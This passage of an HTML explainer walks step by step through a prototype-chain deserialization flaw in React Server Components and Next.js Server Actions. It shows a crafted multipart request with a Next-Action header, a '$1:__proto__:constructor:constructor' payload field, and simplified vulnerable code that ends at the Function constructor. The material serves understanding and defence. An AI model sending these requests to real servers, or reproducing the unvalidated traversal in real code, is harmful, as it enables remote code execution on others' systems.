------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="1"

{"x":1}
------WebKitFormBoundary7MA4YWxkTrZu0gW--</code></pre>

        <h2>Processing Flow</h2>

        <div class="step-box">
            <h3>Step 1: HTTP Request Reception</h3>
            <p>The malicious HTTP POST request arrives at the Node.js server with special headers:</p>
            <pre><code>POST / HTTP/1.1
Host: vulnerable-server.com
Next-Action: 409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...</code></pre>
            
            <p><strong>Key Header:</strong> <code>Next-Action</code> signals to Next.js that this is a React Server Component action request.</p>
        </div>

        <div class="step-box">
            <h3>Step 2: Next.js Routing Detection</h3>
            <p>Next.js App Router recognizes the request as an RSC action:</p>
            <pre><code>// Next.js internal routing logic
if (request.headers['next-action']) {
  // This is a Server Action - route to RSC handler
  return handleServerAction(request);
}</code></pre>
        </div>

        <div class="step-box">
            <h3>Step 3: Multipart Form Data Parsing</h3>
            <p>Node.js multipart parser (using libraries like <code>busboy</code>) extracts the form fields:</p>
            
            <pre><code>// Raw multipart data gets parsed into JavaScript object
const parsedFormData = {
  "0": '{"then":"$1:__proto__:constructor:constructor"}',
  "1": '{"x":1}'
}</code></pre>

            <p><strong>Result:</strong></p>
            <ul>
                <li>Field "0": Contains the malicious reference string</li>
                <li>Field "1": Contains a simple object</li>
            </ul>
        </div>

        <div class="step-box">
            <h3>Step 4: JSON Parsing</h3>
            <p>Each form field value is parsed as JSON:</p>
            
            <pre><code>// Parse field "0"
const field0 = JSON.parse('{"then":"$1:__proto__:constructor:constructor"}');
// Result: { then: "$1:__proto__:constructor:constructor" }

// Parse field "1"
const field1 = JSON.parse('{"x":1}');
// Result: { x: 1 }</code></pre>
        </div>

        <div class="step-box">
            <h3>Step 5: RSC Deserializer Processing (THE VULNERABILITY)</h3>
            
            <div class="danger-highlight">
                <strong>🔴 CRITICAL SECTION - WHERE EXPLOITATION OCCURS</strong>
            </div>

            <p>The React Server Components deserializer processes the parsed data:</p>

            <pre><code>// Simplified vulnerable code from React/Next.js
function deserializeServerAction(formData) {
  const values = [];
  
  // Store parsed values
  values[0] = { then: "$1:__proto__:constructor:constructor" };
  values[1] = { x: 1 };
  
  // Process special references (objects with "then" property starting with "$")
  if (values[0].then && values[0].then.startsWith("$")) {
    // Extract the reference path
    const referencePath = values[0].then;
    // "$1:__proto__:constructor:constructor"
    
    // Split into parts
    const parts = referencePath.split(":");
    // ["$1", "__proto__", "constructor", "constructor"]
    
    // Get the starting object (field 1)
    const startIndex = parseInt(parts[0].substring(1)); // "1"
    let target = values[startIndex]; // { x: 1 }
    
    // 🔴 DANGEROUS: Traverse the property chain without validation
    for (let i = 1; i < parts.length; i++) {
      target = target[parts[i]];
    }
    
    // After traversal, 'target' now points to Function constructor!
    return target;
  }
}</code></pre>
        </div>

        <h2>Step-by-Step Chain Traversal</h2>

        <div class="flow-diagram"><strong>Starting Point:</strong> target = { x: 1 }

<span class="arrow">↓</span> Step 1: Access <code>__proto__</code>

target = { x: 1 }.__proto__
<strong>Result:</strong> Object.prototype (the base prototype of all objects)

<span class="arrow">↓</span> Step 2: Access first <code>constructor</code>

target = Object.prototype.constructor
<strong>Result:</strong> Object (the Object constructor function)

<span class="arrow">↓</span> Step 3: Access second <code>constructor</code>

target = Object.constructor
<strong>Result:</strong> Function (the Function constructor)

<span class="arrow">↓</span> <span class="highlight-danger">💀 EXPLOITATION ACHIEVED</span>

<strong>Final Result:</strong> target now references the Function constructor
Attacker can now execute: <code>Function("malicious code")()</code></div>

